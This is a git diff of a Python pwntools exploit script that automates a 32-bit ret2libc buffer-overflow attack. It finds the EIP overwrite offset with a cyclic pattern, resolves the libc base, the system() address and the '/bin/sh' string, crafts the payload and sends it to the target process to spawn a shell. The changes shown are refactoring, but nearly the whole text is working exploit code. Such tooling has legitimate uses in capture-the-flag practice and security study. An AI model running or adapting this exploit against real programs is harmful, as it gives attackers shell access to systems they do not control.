@@ -29,28 +29,25 @@ def exploit(binary_path):
         offset = find_offset(binary_path)
         log.debug(f"The offset calculated to overwrite EIP is {offset} bytes")
 
-        # Get the current C standard library during runtime
-        libc = elf.libc
-
-        # Get the address of the system() function
-        system_addr = libc.symbols["system"]
-        log.debug(f"The address of system() is {hex(system_addr)}")
-
         # Get the libc base address
         libc_base_addr = calculate_libc(binary_path)
         log.debug(f"The base address of libc is {hex(libc_base_addr)}")
 
+        # Get the address of the system() function
+        system_addr = elf.libc.symbols["system"]
+        log.debug(f"The address of system() is {hex(system_addr)}")
+
         # Get the address of 'bin/sh' string
-        binsh = next(libc.search(b'/bin/sh')) 
+        binsh = next(elf.libc.search(b'/bin/sh\x00')) 
         log.debug(f"The address of '/bin/sh' is {hex(binsh)}")       
 
         # Craft the payload using a ret2libc attack method
-        payload = ret2libc(offset, libc_base_addr, system_addr, binsh)
+        payload = ret2libc_x86(offset, libc_base_addr, system_addr, binsh)
 
         # Print the payload in hexadecimal representation for debugging purposes
         log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
 
-        # Send the payload and spawn a shell
+        # Recieve data and send payload to process
         io.clean()
         io.sendline(payload)
 
@@ -75,7 +72,7 @@ def calculate_libc(binary_path):
     else:
         raise Exception(f"Error: libc not found in {binary_path}")
 
-def ret2libc(offset, libc_base_addr, system_addr, binsh):
+def ret2libc_x86(offset, libc_base_addr, system_addr, binsh):
 
     # Construct the payload for the ret2libc exploit
     try:
@@ -87,8 +84,8 @@ def ret2libc(offset, libc_base_addr, system_addr, binsh):
         # Return the crafted payload
         return payload
 
-    except Exception as e:
-        print(f"An error occurred: {str(e)}")
+    except ValueError as e:
+        print(f"An error occurred when attempting ret2libc: {str(e)}")
         return None
 
 def find_offset(binary_path):
@@ -115,10 +112,9 @@ def find_offset(binary_path):
 
             # Get the corefile to extract the value of the instruction pointer (eip)
             core = io.corefile
-            eip = core.eip
 
             # Find the offset by searching for the cyclic pattern in the eip value
-            offset = cyclic_find(p32(eip), n=4)
+            offset = cyclic_find(p32(core.eip), n=4)
 
             # Revert the log level to the original value
             context.log_level = log_level
